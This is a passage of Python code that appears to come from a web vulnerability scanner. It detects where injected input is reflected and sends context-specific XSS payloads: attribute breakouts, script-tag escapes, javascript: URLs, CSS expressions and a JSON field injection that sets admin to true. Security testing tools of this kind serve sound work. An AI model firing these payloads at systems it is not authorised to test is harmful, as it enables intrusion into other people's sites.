    # ─── ADAPTIVE PAYLOAD ENGINE (context-aware) ─────────────────────────

    def test_adaptive_payload_engine(self):
        """Adaptive Payload Engine — analyzes response format and generates context-aware payloads."""
        if not self.deep: return
        self._print("[*]", "Adaptive Payload Engine (context-aware)...", "INFO")
        tested = set()
        for url, params in list(self.params_seen)[:10]:
            for p in params:
                if (url, p) in tested: continue
                tested.add((url, p))
                # 1. Send normal value and analyze response context
                base_r = self._get(self._inject(url, p, "test_marker_xyz"))
                if not base_r: continue
                body = base_r.text or ""
                # Detect context: HTML attribute, script, JSON, URL, CSS
                contexts = []
                if "test_marker_xyz" in body:
                    idx = body.index("test_marker_xyz")
                    before = body[max(0,idx-50):idx]
                    after = body[idx+len("test_marker_xyz"):idx+len("test_marker_xyz")+50]
                    if '"' in before[-5:] or "'" in before[-5:]:
                        contexts.append("attribute")
                    if "<script" in before.lower():
                        contexts.append("script")
                    if "href=" in before.lower() or "src=" in before.lower():
                        contexts.append("url")
                    if "style=" in before.lower():
                        contexts.append("css")
                    if "json" in (base_r.headers.get("Content-Type","")).lower():
                        contexts.append("json")
                    # Generate context-aware payloads
                    context_payloads = {
                        "attribute": ['" onfocus=alert(1) autofocus=',
                                       "' onmouseover=alert(1) x='"],
                        "script": ["</script><script>alert(1)</script>",
                                    "';alert(1);//"],
                        "url": ["javascript:alert(1)",
                                 "data:text/html,<script>alert(1)</script>"],
                        "css": ["expression(alert(1))",
                                 "background:url(javascript:alert(1))"],
                        "json": ['","x":"<script>alert(1)</script>"}',
                                  '","admin":true}'],
                    }
                    for ctx in contexts:
                        for payload in context_payloads.get(ctx, []):
                            marker = "adapt" + "".join(random.choices(string.ascii_lowercase, k=5))
                            full_payload = marker + payload
                            test_url = self._inject(url, p, full_payload)
                            r = self._get(test_url)
                            if r and marker in (r.text or "") and payload in (r.text or ""):
                                self._add_vuln(
                                    f"Adaptive XSS (context={ctx}) on {p}",
                                    "HIGH", test_url,
                                    f"context={ctx} payload={payload[:50]}",
                                    param=p, context=ctx, payload=payload[:50])

